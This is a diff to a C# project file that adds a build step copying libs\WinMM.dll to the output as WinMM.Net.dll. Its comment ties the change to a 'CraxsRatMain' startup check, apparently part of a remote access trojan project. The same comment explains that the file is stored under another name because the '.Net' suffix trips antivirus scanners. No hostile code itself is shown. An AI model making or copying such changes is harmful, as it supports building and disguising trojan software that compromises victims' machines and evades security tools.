@@ -53,4 +53,15 @@
     <Reference Include="PresentationFramework" />
     <Reference Include="WindowsBase" />
   </ItemGroup>
+  <ItemGroup>
+    <!-- WinMM.dll is the assembly WinMM.Net. The CLR binder and the
+         CraxsRatMain startup check (reso.MY_Path) both demand a file
+         literally named WinMM.Net.dll, so copy it under that name. The
+         file is stored as WinMM.dll at the source because the ".Net"
+         suffix trips some AV scanners. -->
+    <None Include="libs\WinMM.dll">
+      <Link>WinMM.Net.dll</Link>
+      <CopyToOutputDirectory>PreserveNewest</CopyToOutputDirectory>
+    </None>
+  </ItemGroup>
 </Project>
